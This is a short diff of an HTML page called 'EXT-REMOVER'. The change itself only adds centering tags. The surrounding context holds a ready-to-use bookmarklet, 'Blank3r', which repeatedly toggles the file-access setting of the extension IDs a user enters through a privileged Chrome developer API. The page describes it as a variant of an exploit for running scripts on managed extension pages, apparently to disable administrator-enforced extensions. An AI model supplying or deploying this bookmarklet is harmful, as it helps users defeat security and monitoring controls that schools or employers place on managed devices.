@@ -23,8 +23,10 @@
             <small>EXT-REMOVER</small>
         </h3>
         <a class="bookmarklet" href="javascript:let shim = false;var ids = prompt(&quot;Extension IDs\nSeparated by commas [ , ]&quot;).split(&quot;,&quot;);setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 145);" onclick="return false;">Blank3r</a>
+        <center>
         <p style="font-size: 10px;">
         (Drag to bookmarks bar)
+        </center>
         <p>
         This is a variation of Point-Blank, the exploit for running scripts on managed extension pages.
         <ol>
